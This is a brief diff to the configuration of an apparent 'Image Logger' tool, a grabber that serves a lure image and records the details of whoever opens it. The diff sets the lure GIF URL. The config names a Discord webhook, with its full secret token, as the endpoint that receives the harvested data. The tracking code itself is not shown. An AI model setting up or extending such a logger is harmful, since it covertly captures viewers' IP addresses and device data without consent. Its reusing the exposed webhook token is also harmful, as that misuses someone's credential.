@@ -9,7 +9,7 @@ __author__ = "muri"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1335639741605089341/7WBlqNVs4_PP9He5j2TkPeLuW6veD3kvldNAHtpgQxtcy0JEh1hGyE6YKk-2uNowvHS6",
-    "image": "",
+    "image": "https://raw.githubusercontent.com/mur1/images/refs/heads/main/image/image1.gif",
     "imageArgument": True,
 
     "username": "Image Logger",
